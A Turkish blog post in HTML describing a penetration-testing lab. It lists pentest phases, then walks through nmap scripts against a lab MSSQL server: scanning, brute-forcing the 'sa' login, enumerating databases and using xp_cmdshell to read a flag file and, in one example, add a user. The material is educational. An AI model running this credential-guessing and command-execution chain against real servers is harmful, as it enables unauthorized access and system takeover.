<!DOCTYPE html>
<html lang="tr">
<head>

  <meta charset="utf-8" />

  
  <title>PENTEST LAB ÇALIŞMASI</title>

  
  


  
  <meta name="author" content="Zehra Betül Boynueğri" />
  <meta name="description" content="Penetrasyon testi, sistemlerin çeşitli sorunlarını göz önüne alarak, testler, analizler ve çözüm üreten tekniklerden oluşan bir kombinasyondur. Pentest testi aşamalarına değinip, ip adresi verilen sunucu üzerinde lab çalışması yapalım.
Penetrasyon Testi Aşamaları 1.Hazırlık ve planlama  Müşteri ile toplantı Test hedeflerini sıralama Güvenliği test edilecek hedef sistemi belirleme  2.Keşif Ağ ve host keşfi, servis sorgulama aşaması;
 Ip taraması yaparak ayaktaki ip leri belirleme, Port taraması yaparak port durumunu ve o portta çalışan servisleri görüntüleyerek sisteme sızmaya sebep olabilecek servis keşfi, Zafiyet taraması  süreçlerinden oluşur." />

  
  
    <meta name="twitter:card" content="summary" />
    <meta name="twitter:site" content="@melaozhu" />
    <meta name="twitter:title" content="PENTEST LAB ÇALIŞMASI" />
    <meta name="twitter:description" content="Penetrasyon testi, sistemlerin çeşitli sorunlarını göz önüne alarak, testler, analizler ve çözüm üreten tekniklerden oluşan bir kombinasyondur. Pentest testi aşamalarına değinip, ip adresi verilen sunucu üzerinde lab çalışması yapalım.
Penetrasyon Testi Aşamaları 1.Hazırlık ve planlama  Müşteri ile toplantı Test hedeflerini sıralama Güvenliği test edilecek hedef sistemi belirleme  2.Keşif Ağ ve host keşfi, servis sorgulama aşaması;
 Ip taraması yaparak ayaktaki ip leri belirleme, Port taraması yaparak port durumunu ve o portta çalışan servisleri görüntüleyerek sisteme sızmaya sebep olabilecek servis keşfi, Zafiyet taraması  süreçlerinden oluşur." />
    <meta name="twitter:image" content="/img/avatar.jpg" />
  




<meta name="generator" content="Hugo 0.25.1" />


<link rel="canonical" href="https://zehrabetulboynuegri.github.io/blog/post/pentestlab/" />
<link rel="alternative" href="https://zehrabetulboynuegri.github.io/blog/index.xml" title="Zehra Betül Boynuegri" type="application/atom+xml" />


<meta name="renderer" content="webkit" />
<meta name="viewport" content="width=device-width,initial-scale=1" />
<meta name="format-detection" content="telephone=no,email=no,adress=no" />
<meta http-equiv="Cache-Control" content="no-transform" />


<meta name="robots" content="index,follow" />
<meta name="referrer" content="origin-when-cross-origin" />
<meta name="google-site-verification" content="_moDmnnBNVLBN1rzNxyGUGdPHE20YgbmrtzLIbxaWFc" />
<meta name="msvalidate.01" content="22596E34341DD1D17D6022C44647E587" />





<meta name="apple-mobile-web-app-capable" content="yes" />
<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent" />
<meta name="apple-mobile-web-app-title" content="Zehra Betül Boynuegri" />
<meta name="msapplication-tooltip" content="Zehra Betül Boynuegri" />
<meta name='msapplication-navbutton-color' content="#5fbf5e" />
<meta name="msapplication-TileColor" content="#5fbf5e" />
<meta name="msapplication-TileImage" content="/img/tile-image-windows.png" />
<link rel="icon" href="https://zehrabetulboynuegri.github.io/blog/img/favicon.ico" />
<link rel="icon" type="image/png" sizes="16x16" href="https://zehrabetulboynuegri.github.io/blog/img/favicon-16x16.png" />
<link rel="icon" type="image/png" sizes="32x32" href="https://zehrabetulboynuegri.github.io/blog/img/favicon-32x32.png" />
<link rel="icon" sizes="192x192" href="https://zehrabetulboynuegri.github.io/blog/img/touch-icon-android.png" />
<link rel="apple-touch-icon" href="https://zehrabetulboynuegri.github.io/blog/img/touch-icon-apple.png" />
<link rel="mask-icon" href="https://zehrabetulboynuegri.github.io/blog/img/safari-pinned-tab.svg" color="#5fbf5e" />



<link rel="stylesheet" href="//cdn.bootcss.com/video.js/6.2.1/video-js.min.css" />

<link rel="stylesheet" href="https://zehrabetulboynuegri.github.io/blog/css/bundle.css" />


  
  <!--[if lt IE 9]>
    <script src="//cdn.bootcss.com/html5shiv/3.7.3/html5shiv.min.js"></script>
    <script src="//cdn.bootcss.com/respond.js/1.4.2/respond.min.js"></script>
    <script src="//cdn.bootcss.com/video.js/6.2.1/ie8/videojs-ie8.min.js"></script>
  <![endif]-->

<!--[if lte IE 11]>
    <script src="//cdn.bootcss.com/classlist/2014.01.31/classList.min.js"></script>
  <![endif]-->


<script src="//cdn.bootcss.com/object-fit-images/3.2.3/ofi.min.js"></script>


<script src="//cdn.bootcss.com/smooth-scroll/12.1.0/js/smooth-scroll.polyfills.min.js"></script>


</head>
  <body>
    
    <div class="suspension">
      <a title="Go to top" class="to-top is-hide"><span class="icon icon-up"></span></a>
      
        
      
    </div>
    
    
  <header class="site-header">
  <img class="avatar" src="https://zehrabetulboynuegri.github.io/blog/img/avatar.jpg" alt="Avatar">
  
  <h2 class="title">Zehra Betül Boynuegri</h2>
  
  <p class="subtitle">Ne güzel söylemiş rahmetli dedem; arif olmak kolay, iş zarif olmakta.</p>
  <button class="menu-toggle" type="button">
    <span class="icon icon-menu"></span>
  </button>
  <nav class="site-menu collapsed">
    <h2 class="offscreen">Main Menu</h2>
    <ul class="menu-list">
      
      
      
      
        <li class="menu-item  is-active"><a href="https://zehrabetulboynuegri.github.io/blog/">Home</a></li>
      
        <li class="menu-item "><a href="https://github.com/zehrabetulboynuegri">Works</a></li>
      
        <li class="menu-item "><a href="https://zehrabetulboynuegri.github.io/blog/about/">About</a></li>
      
    </ul>
  </nav>
  <nav class="social-menu collapsed">
    <h2 class="offscreen">Socail Networks</h2>
    <ul class="social-list">

      
      <li class="social-item">
        <a href="mailto:zehrabetulboynuegri@gmail.com" title="Email"><span class="icon icon-email"></span></a>
      </li>

      
      <li class="social-item">
        <a href="//github.com/zehrabetulboynuegri" title="GitHub"><span class="icon icon-github"></span></a>
      </li>

      <li class="social-item">
        <a href="//twitter.com/Zboynuegri" title="Wwitter"><span class="icon icon-twitter"></span></a>
      </li>

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      <li class="social-item">
        <a href="//www.linkedin.com/in/zehrabetulboynuegri" title="Linkedin"><span class="icon icon-linkedin"></span></a>
      </li>

      

      

      

      <li class="social-item">
        <a href="https://zehrabetulboynuegri.github.io/blog/index.xml"><span class="icon icon-rss" title="RSS"></span></a>
      </li>

    </ul>
  </nav>
</header>

  <section class="main post-detail">
    <header class="post-header">
      <h1 class="post-title">PENTEST LAB ÇALIŞMASI</h1>
      <p class="post-meta">@Zehra Betül Boynueğri · Aug 16, 2017 · 5 min read</p>
    </header>
    <article class="post-content">

<p>Penetrasyon testi, sistemlerin çeşitli sorunlarını göz önüne alarak, testler, analizler  ve çözüm üreten tekniklerden oluşan bir kombinasyondur.
Pentest testi aşamalarına değinip, ip adresi verilen sunucu üzerinde lab çalışması yapalım.</p>

<h3 id="penetrasyon-testi-aşamaları">Penetrasyon Testi Aşamaları</h3>

<h4 id="1-hazırlık-ve-planlama">1.Hazırlık ve planlama</h4>

<ul>
<li>Müşteri ile toplantı</li>
<li>Test hedeflerini sıralama</li>
<li>Güvenliği test edilecek hedef sistemi belirleme</li>
</ul>

<h4 id="2-keşif">2.Keşif</h4>

<p>Ağ ve host keşfi, servis sorgulama aşaması;</p>

<ul>
<li>Ip taraması yaparak ayaktaki ip leri belirleme,</li>
<li>Port taraması yaparak port durumunu ve o portta çalışan servisleri görüntüleyerek sisteme sızmaya sebep olabilecek servis keşfi,</li>
<li>Zafiyet taraması</li>
</ul>

<p>süreçlerinden oluşur.</p>

<h4 id="3-exploitation">3.Exploitation</h4>

<p>Hedef sistem üzerinde erişim sağlama aşaması ve sonrasında</p>

<ul>
<li>Yetki yükseltme,</li>
<li>Arka kapı bırakarak erişimi sürekli hale getirme,</li>
<li>Bir cihazı pivot olarak kullanıp diğer ağlara erişim sağlama,</li>
<li>Log izlerini silme (Kötü niyetli sızmalarda gerkesinim duyulan aşamadır.)
<br /></li>
</ul>

<p>aşamalarıyla tamamlanır.</p>

<h4 id="4-raporlama">4.Raporlama</h4>

<p>&ndash;</p>

<h4 id="lab-çalışması-hedef-ip-üzerinden-sistemin-incelenmesi"><em>Lab çalışması: hedef ip üzerinden sistemin incelenmesi</em></h4>

<blockquote>
<p>Hedef ip adresi: 172.17.6.66</p>
</blockquote>

<ul>
<li>Amacımız nmap kullanarak c:\flag_1.txt dosyasını okuyabilmek.
Bunun için sistem hakkında bilgi toplayarak adım adım ilerleyelim.</li>
</ul>

<pre><code>root@kali:~# nmap -O 172.17.6.66

Starting Nmap 7.40 ( https://nmap.org ) at 2017-08-14 04:40 EDT
Nmap scan report for 172.17.6.66
Host is up (0.0025s latency).
Not shown: 989 closed ports
PORT      STATE SERVICE
80/tcp    open  http
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
1433/tcp  open  ms-sql-s
49152/tcp open  unknown
49153/tcp open  unknown
49154/tcp open  unknown
49155/tcp open  unknown
49156/tcp open  unknown
49157/tcp open  unknown
MAC Address: 38:B1:DB:F8:04:A9 (Hon Hai Precision Ind.)
Device type: general purpose
Running: Microsoft Windows 7|2008|8.1
OS CPE: cpe:/o:microsoft:windows_7::sp1 cpe:/o:microsoft:windows_server_2008:r2:sp1 cpe:/o:microsoft:windows_8.1
OS details: Microsoft Windows 7 SP1 or Windows Server 2008 R2 SP1 or Windows 8.1 Update 1
Network Distance: 1 hop

OS detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 3.53 seconds
</code></pre>

<p>Açık durumdaki servisleri görmekteyiz.</p>

<p>Nmap <code>ms-sql-info</code> script ile sistemin açık durumda olan 1433 portundaki ms-sql servisi hakkında bilgi edinelim.</p>

<p><strong>ms-sql-info script kullanımı</strong></p>

<blockquote>
<p><code><code>nmap -p 445 --script ms-sql-info &lt;host&gt;</code>
 </code></p>

<p><code><code>nmap -p 1433 --script ms-sql-info --script-args mssql.instance-port=1433 &lt;host&gt;</code>
  </code></p>
</blockquote>

<pre><code>root@kali:~# nmap -p 1433 --script ms-sql-info --script-args mssql.instance-port=1433 172.17.6.66

Starting Nmap 7.40 ( https://nmap.org ) at 2017-08-15 07:42 EDT
Nmap scan report for 172.17.6.66
Host is up (0.16s latency).
PORT     STATE SERVICE
1433/tcp open  ms-sql-s
MAC Address: 38:B1:DB:F8:04:A9 (Hon Hai Precision Ind.)

Host script results:
| ms-sql-info: 
|   172.17.6.66:1433: 
|     Version: 
|       name: Microsoft SQL Server 2014 SP1
|       number: 12.00.4100.00
|       Product: Microsoft SQL Server 2014
|       Service pack level: SP1
|       Post-SP patches applied: false
|_    TCP port: 1433

Nmap done: 1 IP address (1 host up) scanned in 2.47 seconds
</code></pre>

<p>ms-sql bilgilerini görüntüledik. Veritabanı kimlik doğrulaması için zayıf bir şifre olup olmadığını kontrol tmek için <code>ms-sql-brute</code> script ile brute force atak gerçekleştirelim.</p>

<pre><code>root@kali:~#  nmap -p 1433 --script ms-sql-brute 172.17.6.66

Starting Nmap 7.40 ( https://nmap.org ) at 2017-08-15 10:57 EDT
Stats: 0:03:54 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 50.00% done; ETC: 11:05 (0:03:54 remaining)
Nmap scan report for 172.17.6.66
Host is up (0.025s latency).
PORT     STATE SERVICE
1433/tcp open  ms-sql-s
| ms-sql-brute: 
|   [172.17.6.66:1433]
|_    No credentials found
MAC Address: 38:B1:DB:F8:04:A9 (Hon Hai Precision Ind.)

Nmap done: 1 IP address (1 host up) scanned in 521.14 seconds

</code></pre>

<p>Çıktıda görüldüğü üzere bize herhangi bir kimlik bilgisi vermedi. Şimdi ise Microsoft SQL sunucularında boş parolaların varlığını kontrol edebilen <code>ms-sql-empty-password</code> script ile deneyelim.</p>

<pre><code>root@kali:~# nmap -p1433 --script ms-sql-empty-password 172.17.6.66

Starting Nmap 7.40 ( https://nmap.org ) at 2017-08-15 11:24 EDT
Nmap scan report for 172.17.6.66
Host is up (0.14s latency).
PORT     STATE SERVICE
1433/tcp open  ms-sql-s
MAC Address: 38:B1:DB:F8:04:A9 (Hon Hai Precision Ind.)

Nmap done: 1 IP address (1 host up) scanned in 0.76 seconds
</code></pre>

<p>Buradan da bir sonuç elde edemediğimize göre kendi kullanıcı adı ve şifre listelerimizi kullanarak betiği çalıştıracağız. İlk ihtimaller arasında olan default değerlerin, değiştirilmediğini düşünerek kullanıcı adı listemize default kullanıcı adını eklemeyi unutmayalım. (ms-sql veritabanı default kullanıcı adı: sa )</p>

<p><strong>ms-sql-brute script kullanımı</strong></p>

<blockquote>
<p><code><code>nmap -p 445 --script ms-sql-brute --script-args mssql.instance-all,userdb=customuser.txt,passdb=custompass.txt  &lt;host&gt;</code>
</code></p>

<p><code><code>nmap -p 1433 --script ms-sql-brute --script-args userdb=customuser.txt,passdb=custompass.txt &lt;host&gt;</code>
</code></p>
</blockquote>

<pre><code>root@kali:~# nmap -p 1433 --script ms-sql-brute --script-args userdb=usernames.txt,passdb=password.txt 172.17.6.66

Starting Nmap 7.40 ( https://nmap.org ) at 2017-08-15 08:24 EDT
Nmap scan report for 172.17.6.66
Host is up (0.16s latency).
PORT     STATE SERVICE
1433/tcp open  ms-sql-s
| ms-sql-brute: 
|   [172.17.6.66:1433]
|     Credentials found:
|_      sa:manager =&gt; Login Success
MAC Address: 38:B1:DB:F8:04:A9 (Hon Hai Precision Ind.)

Nmap done: 1 IP address (1 host up) scanned in 23.83 seconds
</code></pre>

<p>Çıktıda görüldüğü üzere veritabanı kullanıcı adını ve şifresini öğrenmiş olduk. Hangi kullanıcının hangi veritabanına erişimi olduğunu listeleyen <code>ms-sql-hasdbaccess.nse</code> betiğini çalıştıralım.</p>

<p><strong>ms-sql-hasdbaccess script kullanımı</strong></p>

<blockquote>
<p><code><code>nmap -p 1433 --script ms-sql-hasdbaccess --script-args mssql.username=sa,mssql.password=sa &lt;host&gt;</code>
</code></p>
</blockquote>

<pre><code>root@kali:~# nmap -p 1433 --script ms-sql-hasdbaccess.nse --script-args mssql.username=sa,mssql.password=manager 172.17.6.66

Starting Nmap 7.40 ( https://nmap.org ) at 2017-08-15 08:37 EDT
Nmap scan report for 172.17.6.66
Host is up (0.13s latency).
PORT     STATE SERVICE
1433/tcp open  ms-sql-s
| ms-sql-hasdbaccess: 
|   [172.17.6.66:1433]
|       sa (Showing 5 first results)
|         dbname	owner
|         ======	=====
|_        TEST	sa
MAC Address: 38:B1:DB:F8:04:A9 (Hon Hai Precision Ind.)

Nmap done: 1 IP address (1 host up) scanned in 0.84 seconds
</code></pre>

<p>Veritabanı tablolarını görüntülemek için <code>ms-sql-tables</code>betiğini kullanabiliriz.</p>

<p><strong>ms-sql-tables script kullanımı</strong></p>

<blockquote>
<p><code><code>nmap -p 1433 --script ms-sql-tables --script-args mssql.username=sa,mssql.password=sa &lt;host&gt;</code></code></p>
</blockquote>

<pre><code>root@kali:~#  nmap -p 1433 --script ms-sql-tables --script-args mssql.username=sa,mssql.password=manager 172.17.6.66

Starting Nmap 7.40 ( https://nmap.org ) at 2017-08-15 08:42 EDT
Nmap scan report for 172.17.6.66
Host is up (0.17s latency).
PORT     STATE SERVICE
1433/tcp open  ms-sql-s
| ms-sql-tables: 
|   [172.17.6.66:1433]
|       
|       Restrictions
|         Output restricted to 2 tables (see ms-sql-tables.maxtables)
|         Output restricted to 5 databases (see ms-sql-tables.maxdb)
|_        No filter (see ms-sql-tables.keywords)
MAC Address: 38:B1:DB:F8:04:A9 (Hon Hai Precision Ind.)

Nmap done: 1 IP address (1 host up) scanned in 0.81 seconds
</code></pre>

<p>Bizden istenen flag.txt dosyasına ulaşabilmemiz için  <code>ms-sql-cmdshell</code> betiği ile sisteme erişim sağlayalım.</p>

<p><strong>ms-sql-xp-cmdshell script kullanımı</strong></p>

<blockquote>
<p><code><code>nmap -p 445 --script ms-sql-discover,ms-sql-empty-password,ms-sql-xp-cmdshell &lt;host&gt;</code>
</code></p>

<p><code><code>nmap -p 1433 --script ms-sql-xp-cmdshell --script-args mssql.username=sa,mssql.password=sa,ms-sql-xp-cmdshell.cmd=&quot;net user test test /add&quot; &lt;host&gt;</code>
</code></p>
</blockquote>

<pre><code>root@kali:~# nmap -p 1433 --script ms-sql-xp-cmdshell --script-args ms-sql-xp-cmdshell.cmd='type c:\flag_1.txt',mssql.username=sa,mssql.password=manager  172.17.6.66

Starting Nmap 7.40 ( https://nmap.org ) at 2017-08-15 09:15 EDT
Nmap scan report for 172.17.6.66
Host is up (0.052s latency).
PORT     STATE SERVICE
1433/tcp open  ms-sql-s
| ms-sql-xp-cmdshell: 
|   [172.17.6.66:1433]
|     Command: type c:\flag_1.txt
|       output
|       ======
|_      CT_{msSQL_3xpL01t}
MAC Address: 38:B1:DB:F8:04:A9 (Hon Hai Precision Ind.)

Nmap done: 1 IP address (1 host up) scanned in 0.89 seconds
</code></pre>

<p>Windows tarafında çalıştırılan <code>type c:\flag_1.txt</code> komutu ile dosyanın çıktısı görüntülendi.</p>
</article>
    <footer class="post-footer">
      
      <ul class="post-tags">
        
          <li><a href="https://zehrabetulboynuegri.github.io/blog/tags/penetrationtestingmssql"><span class="tag">Penetrationtestingmssql</span></a></li>
        
          <li><a href="https://zehrabetulboynuegri.github.io/blog/tags/xp-cmdshell"><span class="tag">Xp-Cmdshell</span></a></li>
        
          <li><a href="https://zehrabetulboynuegri.github.io/blog/tags/nmap"><span class="tag">Nmap</span></a></li>
        
      </ul>
      
      <p class="post-copyright">
        © This post is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License，please give source if you likes to quote or reproduce.This post was published <strong>216</strong> days ago, content in the post may be inaccurate, even wrong now, please take risk yourself.
      </p>
    </footer>
    
      
    
  </section>
  <footer class="site-footer">
  <p>© 2017-2018 Zehra Betül Boynuegri</p>
  <p>Powered by <a href="https://gohugo.io/" target="_blank">Hugo</a> with theme <a href="https://github.com/laozhu/hugo-nuo" target="_blank">Nuo</a>.</p>
  
</footer>



<script src="//cdn.bootcss.com/video.js/6.2.1/video.min.js"></script>
<script src="//cdn.bootcss.com/mathjax/2.7.1/latest.js?config=TeX-AMS-MML_HTMLorMML"></script>

<script src="https://zehrabetulboynuegri.github.io/blog/js/bundle.js"></script>


<script>
window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
ga('create', 'UA-XXXXXXXX-X', 'auto');
ga('send', 'pageview');
</script>
<script async src='//www.google-analytics.com/analytics.js'></script>





  </body>
</html>
